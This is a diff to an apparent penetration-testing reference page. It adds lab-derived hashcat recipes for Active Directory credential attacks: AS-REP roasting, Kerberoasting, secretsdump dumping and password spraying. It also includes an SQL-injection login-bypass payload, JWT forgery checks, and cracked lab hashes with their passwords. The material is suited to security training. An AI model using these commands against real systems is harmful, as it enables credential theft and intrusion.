@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=hashcat) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -23,8 +25,538 @@ hashcat -m HASH_MODE hashes.txt --show
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=hashcat)
+## Notebook recipes
 
-## Learning and original examples
+35 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Hashcat: Modes, Rules, and Masks](/tools/hashcat)
+<AccordionGroup>
+
+<Accordion title="AS-REP Roasting: Quick Reference">
+
+### AS-REP Roasting: Quick Reference
+
+**AS-REP Roasting: Quick Reference**
+
+```bash
+# Linux (Impacket) — with a userlist (no creds) or authenticated
+GetNPUsers.py $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+GetNPUsers.py $DOMAIN/USER:PASS -dc-ip $DC -request         # authenticated: find them all
+nxc ldap $DC -u USER -p PASS --asreproast asrep.hash
+```
+
+**AS-REP Roasting: Quick Reference**
+
+```bash
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="7. Cracking loot">
+
+### 7. Cracking loot
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# download just the file (nxc is reliable through the pivot):
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --share HR --get-file 'Archive\Employee-Passwords_OLD.psafe3' ~/loot/emp.psafe3
+# crack the master password:
+pwsafe2john ~/loot/emp.psafe3 > psafe.hash
+john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
+#   (hashcat alt: hashcat -m 5200 ~/loot/emp.psafe3 rockyou.txt)
+# open it:
+passwordsafe ~/loot/emp.psafe3      # sudo apt install -y passwordsafe
+```
+
+</Accordion>
+
+<Accordion title="Credential / Hash Operations">
+
+### Credential / Hash Operations
+
+**Active Directory Enumeration Commands**
+
+```bash
+secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Dump credential material if sufficiently privileged
+
+secretsdump.py -just-dc '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>'
+    # Extract NTDS domain credentials if sufficiently privileged
+
+hashcat -m 13100 hashes.txt wordlist.txt
+    # Crack Kerberos TGS-REP hashes
+```
+
+</Accordion>
+
+<Accordion title="Authentication and Authorization: Quick Checks">
+
+### Authentication and Authorization: Quick Checks
+
+**Authentication and Authorization: Quick Checks**
+
+```text
+- Default creds: admin:admin, admin:password, tomcat:tomcat, root:root
+- SQLi login bypass:  ' OR '1'='1'-- -   as username
+- Response/param tamper: role=user -> role=admin, forced browsing to /admin
+- JWT: alg=none, weak HMAC secret (crack with hashcat -m 16500), kid path traversal
+- IDOR: change the id in the request to access other users' objects
+```
+
+</Accordion>
+
+<Accordion title="JWT quick checks">
+
+### JWT quick checks
+
+**Authentication and Authorization: Quick Checks**
+
+```bash
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt   # crack HS256 secret
+# then forge with the recovered secret (jwt.io / pyjwt)
+```
+
+</Accordion>
+
+<Accordion title="The three reusable &quot;I control a user&quot; primitives">
+
+### The three reusable "I control a user" primitives
+
+**BloodHound: Full Reference**
+
+```bash
+proxychains python3 targetedKerberoast.py -d <domain> -u <you> -p '<pass>' --request-user <target>
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Forced Authentication Attacks">
+
+### Forced Authentication Attacks
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344386
+* Bytes.....: 139921355
+* Keyspace..: 14344386
+
+ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NetNTLMv2
+Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
+Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
+Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 75776/14344386 (0.53%)
+Rejected.........: 0/75776 (0.00%)
+Restore.Point....: 73728/14344386 (0.51%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: compu -> kodiak1
+
+Started: Mon Apr 11 16:49:34 2022
+Stopped: Mon Apr 11 16:49:37 2022
+```
+
+</Accordion>
+
+<Accordion title="Common modes">
+
+### Common modes
+
+**Hashcat: Modes, Rules, and Masks**
+
+```text
+0     MD5              1000  NTLM
+1800  sha512crypt      1710  sha512(pass.salt)
+13100 Kerberoast TGS   18200 AS-REP
+5600  NetNTLMv2        16500 JWT (HS256)
+22000 WPA-PBKDF2       500   md5crypt
+```
+
+**Hashcat: Modes, Rules, and Masks**
+
+Context from the notebook: Start with  rockyou + best64.rule . If nothing cracks, move to targeted masks or bigger lists ( rockyou2021 ), not blind brute force.
+
+```text
+rockyou + best64.rule
+```
+
+</Accordion>
+
+<Accordion title="Hashcat: Modes, Rules, and Masks">
+
+### Hashcat: Modes, Rules, and Masks
+
+**Hashcat: Modes, Rules, and Masks**
+
+```bash
+hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # +rules
+hashcat -m <mode> hashes.txt -a 3 '?u?l?l?l?l?d?d'                            # mask/brute
+hashcat --show -m <mode> hashes.txt                                          # recovered
+```
+
+</Accordion>
+
+<Accordion title="Step 3: Crack the hashes offline">
+
+### Step 3: Crack the hashes offline
+
+**IPMI and BMC Enumeration**
+
+```bash
+hashcat -m 7300 ipmi_hashes.txt /path/to/wordlist.txt
+```
+
+**IPMI and BMC Enumeration**
+
+```bash
+hashcat -m 7300 ipmi_hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+```
+
+</Accordion>
+
+<Accordion title="Practical Application">
+
+### Practical Application
+
+**Kerberoasting from Linux**
+
+```shell
+hashcat -m 13100 tickets.txt /path/to/wordlist.txt
+```
+
+</Accordion>
+
+<Accordion title="7. Test an RC4 Ticket Offline">
+
+### 7. Test an RC4 Ticket Offline
+
+**Kerberoasting from Windows**
+
+```bash
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Encryption Types">
+
+### Encryption Types
+
+**Kerberoasting from Windows**
+
+```bash
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Export All Results to CSV">
+
+### Export All Results to CSV
+
+**Kerberoasting from Windows**
+
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+</Accordion>
+
+<Accordion title="Quick Reference">
+
+### Quick Reference
+
+**Kerberoasting from Windows**
+
+```powershell
+# Request a ticket for one SPN
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+
+# PowerView enumeration and ticket request
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
+
+# Rubeus statistics and a targeted request
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /user:<USER> /nowrap
+```
+
+**Kerberoasting from Windows**
+
+```bash
+# Decode and convert an exported ticket
+cat encoded_file | base64 -d > ticket.kirbi
+python2.7 kirbi2john.py ticket.kirbi
+
+# Hashcat modes from the section
+hashcat -m 13100 rc4_hashes wordlist.txt
+hashcat -m 19700 aes256_hashes wordlist.txt
+```
+
+</Accordion>
+
+<Accordion title="Request a Ticket for One User">
+
+### Request a Ticket for One User
+
+**Kerberoasting from Windows**
+
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+</Accordion>
+
+<Accordion title="Kerberoasting: Quick Reference">
+
+### Kerberoasting: Quick Reference
+
+**Kerberoasting: Quick Reference**
+
+```bash
+# crack
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Linux Authentication: PAM, passwd, and shadow">
+
+### Linux Authentication: PAM, passwd, and shadow
+
+**Linux Authentication: PAM, passwd, and shadow**
+
+```bash
+hashcat -m 1800 /tmp/unshadow.hashes /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Cracking the Hash Offline with Hashcat">
+
+### Cracking the Hash Offline with Hashcat
+
+**Miscellaneous Misconfigurations**
+
+```shellsession
+grcic550@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca
+Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
+Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10506240/14344385 (73.24%)
+Rejected.........: 0/10506240 (0.00%)
+Restore.Point....: 10493952/14344385 (73.16%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: WellHelloNow -> W14233LTKM
+
+Started: Fri Apr  1 13:18:37 2022
+Stopped: Fri Apr  1 13:18:55 2022
+```
+
+</Accordion>
+
+<Accordion title="Retrieving AS-REP in Proper Format using Rubeus">
+
+### Retrieving AS-REP in Proper Format using Rubeus
+
+**Miscellaneous Misconfigurations**
+
+```powershell
+PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : mmorgan
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
+[*] SamAccountName         : mmorgan
+[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
+[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
+```
+
+</Accordion>
+
+<Accordion title="11. Attacking SAM, SYSTEM &amp; SECURITY">
+
+### 11. Attacking SAM, SYSTEM & SECURITY
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hashcat -m 2100 '$DCC2$10240#administrator#23d975...' /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="4. Hashcat">
+
+### 4. Hashcat
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hashcat -a <attack_mode> -m <hash_type> <hashes> [wordlist | rule | mask]
+```
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hashcat --help | grep -i ntlm        # search the mode list
+hashid -m '$1$FNr44XZC$wQxY6...'      # -m = print the Hashcat mode number
+```
+
+</Accordion>
+
+<Accordion title="BitLocker-encrypted drives">
+
+### BitLocker-encrypted drives
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+bitlocker2john -i Backup.vhd > backup.hashes
+grep "bitlocker\$0" backup.hashes > backup.hash      # $0 = the password hash (the others are recovery-key hashes)
+hashcat -a 0 -m 22100 backup.hash /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Dictionary attack (-a 0)">
+
+### Dictionary attack (-a 0)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
+# add rules when the wordlist alone fails:
+hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+</Accordion>
+
+<Accordion title="Hashcat rule functions">
+
+### Hashcat rule functions
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
+```
+
+</Accordion>
+
+<Accordion title="Mask attack (-a 3)">
+
+### Mask attack (-a 3)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
+```
+
+</Accordion>
+
+<Accordion title="Parse the dump offline with pypykatz">
+
+### Parse the dump offline with pypykatz
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="🔁 Mutating a known OLD password (the stom case)">
+
+### 🔁 Mutating a known OLD password (the stom case)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+# 1. base word
+echo 'fails-nibble-disturb4' > base.txt
+# 2. generate variants with rules (increment digit, toggle case, append symbol/year)
+hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule | sort -u > muts.txt
+# tight hand-list when lockout is a risk:
+printf '%s\n' fails-nibble-disturb5 fails-nibble-disturb6 Fails-nibble-disturb4 \
+  fails-nibble-disturb4! fails-nibble-disturb5! fails-nibble-disturb2025 fails-nibble-disturb2026 >> muts.txt
+# 3. spray the mutations (CAREFULLY — see lockout below)
+proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]'
+```
+
+</Accordion>
+
+<Accordion title="When you don&#x27;t have sysadmin: steal the service account&#x27;s hash with xp_dirtree">
+
+### When you don't have sysadmin: steal the service account's hash with xp_dirtree
+
+**Microsoft SQL Server Enumeration**
+
+Context from the notebook: You then either  crack  the captured NetNTLM hash offline ( hashcat -m 5600 ) or  relay  it with  ntlmrelayx  to authenticate to another host the service account can access — no cracking required. This is the standard escape hatch when the login isn't sysadmin.
+
+```text
+hashcat -m 5600
+```
+
+</Accordion>
+
+</AccordionGroup>
